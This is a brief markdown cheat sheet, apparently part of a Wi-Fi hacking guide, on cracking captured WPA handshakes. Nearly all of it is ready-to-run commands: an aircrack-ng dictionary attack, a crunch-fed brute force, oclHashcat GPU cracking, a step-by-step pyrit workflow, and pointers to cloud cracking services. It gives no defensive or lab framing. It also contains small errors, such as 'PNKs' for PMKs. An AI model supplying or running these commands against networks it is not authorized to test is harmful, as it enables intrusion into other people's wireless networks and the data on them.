# WPA Cracking Techniques

Now that we have captured the handshake, it's time to crack it

**Dictionary Attack**

```sh
sudo aircrack-ng wpa_file*.cap -w <wordlist>
```

**Brute force Attack**

```sh
crunch 8 8 | sudo aircrack-ng -e <ssid> wpa_file*.cap -w -
```

## Cracking speed

- Exploit the GPU Power

```sh
oclHashcat -m 2500 wpa_file <wordlist>
```
Pyrit can make use of computational power of modern GPUs, like oclHashCat, so you are encouraged to run it on a desktop PC with recent video card installed

```sh
# check the database status
pyrit eval

# import passwords froms our wordlist
pyrit -i <wordlist> import_passwords

# generation the PNKs
pyrit -e <ssid> create_essid

# calculated the PNKs
pyrit batch

# crack the password
pyrit -r <wpa_file> attack_db
```

- Cracking as a service (cloud)
    - `OnlineHashCrank`
    - CloudCracker


